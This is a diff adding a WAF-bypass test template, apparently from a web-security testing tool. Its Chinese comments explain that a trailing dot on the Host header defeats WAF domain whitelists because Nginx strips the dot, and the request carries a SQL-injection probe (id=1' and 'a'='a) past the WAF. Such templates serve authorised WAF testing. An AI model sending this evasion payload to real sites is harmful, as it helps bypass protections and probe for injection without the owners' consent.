@@ -1,0 +1,13 @@
+# @name: Host尾点绕过
+# @tags: get,sqli,host,trailing-dot,nginx,cloud-waf,id,bypass
+# @color: green
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: host_trailing_dot
+# @intent.param: id
+# @intent.payload: id=1' and 'a'='a
+# @note: Nginx 源码会把 Host 末尾的 . 去掉(a.com. 等于 a.com)，构造尾点让 WAF 域名白名单匹配失败，流量不再经过 WAF。云 WAF 场景同样适用。
+GET /?id=1'+and+'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}.
+User-Agent: {{USER_AGENT}}
+
